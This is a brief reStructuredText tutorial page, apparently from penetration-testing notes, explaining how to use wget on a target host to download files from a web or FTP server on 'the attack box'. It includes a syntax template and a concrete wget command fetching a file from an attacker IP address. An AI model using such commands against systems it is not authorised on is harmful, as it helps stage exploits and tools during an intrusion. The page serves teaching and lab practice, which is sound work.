.. _ref_wget:

====
wget
====

.. index::
   single: wget
   single: Download tool; wget
   single: File Transfert; wget

.. contents::
    :backlinks: top

####

Wget is a free software package that is installed by default on most Linux distributions and
downloads files using HTTP, HTTPS and FTP.

When wget is available on the target host you just need to setup a web or FTP server on the attack
box to serve the files.

    .. note:: 
        
        **Syntax**
        
        .. code:: shell
            :number-lines:
            :force:

                wget http://[IP Attak Box][:port]/[file name]
        
        .. code:: shell
            :number-lines:
            :force:

                wget http://10.255.247.30/49402.txt

        **Cient side**

        .. image:: images/reqWget.png
            :width: 540 px
            :align: center

####

--------
Weblinks
--------

.. target-notes::